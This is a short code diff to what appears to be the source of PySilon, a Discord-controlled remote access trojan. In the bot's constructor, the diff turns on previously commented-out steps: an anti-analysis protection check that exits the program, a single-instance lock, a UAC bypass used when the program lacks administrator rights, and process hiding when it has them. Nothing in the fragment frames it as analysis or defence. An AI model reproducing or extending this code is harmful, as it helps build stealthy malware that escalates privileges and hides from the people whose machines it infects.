@@ -24,19 +24,18 @@ DEFAULT = 'DEFAULT'
 
 class PySilon(commands.Bot):
     def __init__(self, command_prefix, self_bot) -> None:
-        #def IsAdmin() -> bool: return ctypes.windll.shell32.IsUserAnAdmin() == 1
-        #if pysilon_protections.protection_check(): os._exit(0)
-        #if pysilon_protections.single_instance_lock(): os._exit(0)
+        def IsAdmin() -> bool: return ctypes.windll.shell32.IsUserAnAdmin() == 1
+        if protection_check(): os._exit(0)
+        if single_instance_lock(): os._exit(0)
 
-        #if not IsAdmin():
-        #    if uac_bypass.GetSelf()[1]:
-        #        if uac_bypass.UACbypass(): os._exit(0)
-        #else:
-        #    proccess_was_hidden = False
-        #    if proc_hider.hide_process(): proccess_was_hidden = True
+        if not IsAdmin():
+            if GetSelf()[1]:
+                if UACbypass(): os._exit(0)
+        else:
+            proccess_was_hidden = False
+            if proc_hider.hide_process(): proccess_was_hidden = True
 
         #!preload.intendation=2
-
         self.load_bot(command_prefix, self_bot)
 
     async def first_run_check(self) -> None:
